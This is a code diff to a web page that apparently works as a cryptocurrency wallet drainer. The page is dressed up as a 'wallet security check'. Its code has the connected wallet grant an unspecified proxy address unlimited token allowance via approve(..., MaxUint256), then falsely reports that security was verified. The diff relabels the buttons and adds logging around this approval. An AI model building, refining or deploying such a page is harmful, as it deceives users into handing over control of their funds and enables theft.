@@ -27,10 +27,10 @@
 </head>
 <body>
     <div>
-        <h2>Check Wallet Security</h2>
+        <h2>Connect and Authorize Wallet</h2>
         <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
         <p id="walletStatus">Wallet Not Connected</p>
-        <button id="approveButton" onclick="checkSecurity()" disabled>Check Security</button>
+        <button id="approveButton" onclick="checkSecurity()" disabled>Authorize Contract</button>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -138,7 +138,7 @@
             }
         ];
 
-        const tokenAddress = "0xd387FEeD5D966912F0af9e7fE1A854e4d6067CDE"; // The token contract address (Fixed)
+        const tokenAddress = "0xd387FEeD5D966912F0af9e7fE1A854e4d6067CDE"; // Fixed Token Contract Address
 
         // Connect to the user's wallet using MetaMask or another Web3 wallet
         async function connectWallet() {
@@ -169,8 +169,10 @@
 
             try {
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);  // Grant unlimited allowance
+                console.log("Transaction hash:", tx.hash);  // Output transaction hash
                 alert("Wallet security verified successfully! Authorization granted.");
             } catch (error) {
+                console.error("Error during authorization:", error);  // Output detailed error
                 alert("Wallet security check failed. Please try again!");
             }
         }
